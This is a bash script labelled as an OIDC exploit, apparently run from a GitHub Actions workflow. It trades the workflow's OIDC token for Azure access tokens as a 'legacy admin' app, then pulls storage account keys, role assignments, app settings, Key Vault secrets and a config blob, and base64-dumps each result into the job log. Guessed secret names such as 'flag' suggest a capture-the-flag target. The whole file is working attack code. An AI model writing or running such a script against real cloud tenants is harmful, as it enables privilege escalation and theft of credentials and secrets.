#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v3 - LEGACY ADMIN ==="

T="${AZURE_TENANT_ID}"
LEGACY_APP="891fb158-e02c-4428-a885-53b811f369c0"

# Step 1: Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc_len=${#OIDC}"

# Step 2: Exchange OIDC for tokens AS tbl-legacy-admin
echo "=== LEGACY-ADMIN TOKENS ==="

# Storage token
LEGACY_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LEGACY_APP" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  -d "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
echo "legacy_st_len=${#LEGACY_ST}"

# Try read blob
if [ -n "$LEGACY_ST" ]; then
  echo "=== BLOB READ ==="
  BLOB=$(curl -sS -H "Authorization: Bearer $LEGACY_ST" -H "x-ms-version: 2021-08-06" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" 2>&1)
  echo "BLOB_B64=$(echo "$BLOB" | base64 -w0)"
fi

# ARM token
OIDC3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
LEGACY_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LEGACY_APP" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC3" \
  -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "legacy_arm_len=${#LEGACY_ARM}"

if [ -n "$LEGACY_ARM" ]; then
  SUB="${AZURE_SUBSCRIPTION_ID}"

  echo "=== STORAGE KEYS ==="
  KEYS=$(curl -sS -X POST -H "Authorization: Bearer $LEGACY_ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" 2>&1)
  echo "KEYS_B64=$(echo "$KEYS" | base64 -w0)"

  echo "=== ROLE ASSIGNMENTS ==="
  ROLES=$(curl -sS -H "Authorization: Bearer $LEGACY_ARM" \
    "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" 2>&1)
  echo "ROLES_B64=$(echo "$ROLES" | base64 -w0)"

  echo "=== STOREFRONT APPSETTINGS ==="
  SFSET=$(curl -sS -X POST -H "Authorization: Bearer $LEGACY_ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" 2>&1)
  echo "SFSET_B64=$(echo "$SFSET" | base64 -w0)"

  echo "=== REPORTING APPSETTINGS ==="
  REPSET=$(curl -sS -X POST -H "Authorization: Bearer $LEGACY_ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01" 2>&1)
  echo "REPSET_B64=$(echo "$REPSET" | base64 -w0)"

  echo "=== KV-SEC ACCESS POLICY ==="
  KVPOL=$(curl -sS -H "Authorization: Bearer $LEGACY_ARM" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" 2>&1)
  echo "KVPOL_B64=$(echo "$KVPOL" | base64 -w0)"
fi

# KV-SEC with legacy-admin
OIDC4=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
LEGACY_KV=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$LEGACY_APP" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC4" \
  -d "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "legacy_kv_len=${#LEGACY_KV}"

if [ -n "$LEGACY_KV" ]; then
  echo "=== KV-SEC SECRETS ==="
  KVSEC=$(curl -sS -H "Authorization: Bearer $LEGACY_KV" \
    "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1)
  echo "KVSEC_B64=$(echo "$KVSEC" | base64 -w0)"

  for SN in config-storage-connection CONFIG-STORAGE-CONNECTION storage-connection platform-config flag tbl-flag; do
    VAL=$(curl -sS -H "Authorization: Bearer $LEGACY_KV" \
      "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$SN?api-version=7.4" 2>&1)
    echo "KVSEC_${SN}_B64=$(echo "$VAL" | base64 -w0)"
  done
fi

echo ""
echo "=== DONE v3 ==="
